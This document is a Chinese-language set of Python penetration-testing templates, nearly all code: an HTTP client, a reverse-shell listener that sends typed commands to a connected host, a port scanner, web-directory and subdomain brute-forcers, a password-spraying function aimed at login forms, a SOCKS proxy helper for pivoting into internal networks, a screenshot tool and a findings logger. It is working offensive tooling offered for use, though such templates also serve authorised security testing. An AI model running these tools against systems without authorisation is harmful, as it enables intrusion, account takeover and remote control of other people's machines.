# 常用 Python 脚本模板

## HTTP 请求框架

```python
import requests
import urllib3
urllib3.disable_warnings()

class PentestClient:
    def __init__(self, base_url, proxy=None, verify=False):
        self.session = requests.Session()
        self.base_url = base_url.rstrip('/')
        self.session.verify = verify
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

    def get(self, path, **kwargs):
        return self.session.get(f"{self.base_url}{path}", **kwargs)

    def post(self, path, **kwargs):
        return self.session.post(f"{self.base_url}{path}", **kwargs)

    def request(self, method, path, **kwargs):
        return self.session.request(method, f"{self.base_url}{path}", **kwargs)


# 用法
client = PentestClient("https://target.com", proxy="http://127.0.0.1:8080")
resp = client.get("/api/users")
print(resp.status_code, resp.text[:200])
```

---

## 反弹 Shell 监听器

```python
import socket
import threading
import sys

def listener(port):
    """TCP 反弹 Shell 监听器"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", port))
    server.listen(1)
    print(f"[*] Listening on 0.0.0.0:{port}")
    
    conn, addr = server.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    
    def recv_thread():
        while True:
            try:
                data = conn.recv(4096)
                if not data:
                    break
                sys.stdout.write(data.decode(errors='replace'))
                sys.stdout.flush()
            except:
                break
    
    t = threading.Thread(target=recv_thread, daemon=True)
    t.start()
    
    while True:
        try:
            cmd = input()
            conn.send((cmd + "\n").encode())
        except (KeyboardInterrupt, EOFError):
            break
    
    conn.close()
    server.close()

if __name__ == "__main__":
    listener(int(sys.argv[1]) if len(sys.argv) > 1 else 4444)
```

---

## 端口扫描器

```python
import socket
import concurrent.futures
from contextlib import closing

def scan_port(host, port, timeout=1):
    """扫描单个端口"""
    with closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as sock:
        sock.settimeout(timeout)
        return port if sock.connect_ex((host, port)) == 0 else None

def scan_host(host, ports=range(1, 1025), max_workers=100):
    """并发扫描主机端口"""
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(scan_port, host, p): p for p in ports}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                open_ports.append(result)
                print(f"[+] {host}:{result} OPEN")
    return sorted(open_ports)
```

---

## 目录扫描器

```python
import requests
import concurrent.futures
import urllib3
urllib3.disable_warnings()

def dir_scan(base_url, wordlist_path, extensions=None, threads=50):
    """Web 目录扫描"""
    extensions = extensions or ['']
    found = []
    
    with open(wordlist_path) as f:
        words = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    paths = []
    for word in words:
        for ext in extensions:
            paths.append(f"/{word}{ext}")
    
    def check_path(path):
        try:
            url = f"{base_url.rstrip('/')}{path}"
            resp = requests.get(url, timeout=5, verify=False, allow_redirects=False)
            if resp.status_code not in (404, 400, 500):
                size = len(resp.content)
                print(f"[{resp.status_code}] {path} ({size} bytes)")
                return {'path': path, 'status': resp.status_code, 'size': size}
        except requests.RequestException:
            pass
        return None
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        results = executor.map(check_path, paths)
        found = [r for r in results if r]
    
    return found
```

---

## 子域名枚举器

```python
import dns.resolver
import concurrent.futures

def bruteforce_subdomains(domain, wordlist_path, threads=50):
    """子域名暴力枚举"""
    with open(wordlist_path) as f:
        words = [line.strip() for line in f if line.strip()]
    
    found = []
    resolver = dns.resolver.Resolver()
    resolver.timeout = 3
    resolver.lifetime = 3
    
    def check_subdomain(word):
        subdomain = f"{word}.{domain}"
        try:
            answers = resolver.resolve(subdomain, 'A')
            ips = [str(rdata) for rdata in answers]
            print(f"[+] {subdomain} -> {', '.join(ips)}")
            return {'subdomain': subdomain, 'ips': ips}
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
                dns.resolver.NoNameservers, dns.exception.Timeout):
            pass
        return None
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        results = executor.map(check_subdomain, words)
        found = [r for r in results if r]
    
    return found
```

---

## 密码喷洒

```python
import requests
import time

def password_spray(url, usernames, passwords, success_indicator,
                   fail_indicator=None, delay=1):
    """密码喷洒攻击（低频率避免锁定）"""
    for password in passwords:
        print(f"\n[*] Spraying password: {password}")
        for username in usernames:
            try:
                resp = requests.post(url, data={
                    'username': username,
                    'password': password
                }, allow_redirects=False, timeout=10)
                
                if success_indicator in resp.text or resp.status_code == 302:
                    print(f"[+] VALID: {username}:{password}")
                    return username, password
                
                time.sleep(delay)
            except requests.RequestException as e:
                print(f"[-] Error for {username}: {e}")
    
    return None
```

---

## SOCKS 代理链请求

```python
import requests

def proxied_request(url, socks_proxy="socks5://127.0.0.1:1080", **kwargs):
    """通过 SOCKS 代理发送请求（用于内网穿透）"""
    proxies = {"http": socks_proxy, "https": socks_proxy}
    return requests.get(url, proxies=proxies, timeout=10, **kwargs)
```

---

## 自动化截图

```python
import subprocess
import os

def take_screenshots(urls, output_dir="evidence/screenshots"):
    """批量 Web 页面截图"""
    os.makedirs(output_dir, exist_ok=True)
    for i, url in enumerate(urls):
        output = os.path.join(output_dir, f"screen_{i}.png")
        try:
            subprocess.run([
                "chromium", "--headless", "--disable-gpu",
                f"--screenshot={output}", "--window-size=1920,1080",
                "--no-sandbox", url
            ], timeout=30, capture_output=True)
            print(f"[+] Screenshot: {url} -> {output}")
        except subprocess.TimeoutExpired:
            print(f"[-] Timeout: {url}")
```

---

## 结果输出工具

```python
import json
import csv
from datetime import datetime

class PentestLogger:
    """渗透测试日志记录器"""
    
    def __init__(self, project_dir):
        self.project_dir = project_dir
        self.log_file = os.path.join(project_dir, "notes", "exploit-log.md")
    
    def log_action(self, target, action, result, impact="低"):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = f"""
### [{timestamp}] {action}
- **目标**: {target}
- **操作**: {action}
- **结果**: {result}
- **影响**: {impact}
"""
        with open(self.log_file, 'a') as f:
            f.write(entry)
    
    def save_evidence(self, filename, content):
        path = os.path.join(self.project_dir, "evidence", filename)
        with open(path, 'w') as f:
            f.write(content)
        return path
    
    def export_findings(self, findings, output_format="json"):
        if output_format == "json":
            path = os.path.join(self.project_dir, "findings.json")
            with open(path, 'w') as f:
                json.dump(findings, f, indent=2, ensure_ascii=False)
        elif output_format == "csv":
            path = os.path.join(self.project_dir, "findings.csv")
            if findings:
                with open(path, 'w', newline='') as f:
                    writer = csv.DictWriter(f, fieldnames=findings[0].keys())
                    writer.writeheader()
                    writer.writerows(findings)
        return path
```
